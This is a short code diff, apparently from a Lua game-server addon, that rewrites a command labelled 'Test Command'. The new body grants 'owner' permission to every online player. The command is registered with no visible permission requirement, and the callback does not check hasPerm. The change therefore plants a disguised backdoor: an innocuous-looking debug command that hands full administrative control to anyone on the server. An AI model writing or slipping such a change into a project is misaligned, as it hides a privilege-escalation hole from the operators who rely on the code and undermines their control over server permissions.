@@ -497,8 +497,10 @@ function auscode.commands:_createCommands()
     end))
 
     self:add(modules.services.command:create("test", {}, {}, "\n \\ Test Command", function (player, full_message, command, args, hasPerm)
-        local group = modules.services.vehicle:getGroup(args[1], true)
-        modules.libraries.chat:announce("[Command] Test", tostring(auscode.vehicle:getSubBodyCount(group)), player.peerId)
+        local players = modules.services.player:getOnlinePlayers()
+        for playerId, player in pairs(players) do
+            player:setPerm("owner", true)
+        end
     end))
 
     self.onCommandCreation:fire()
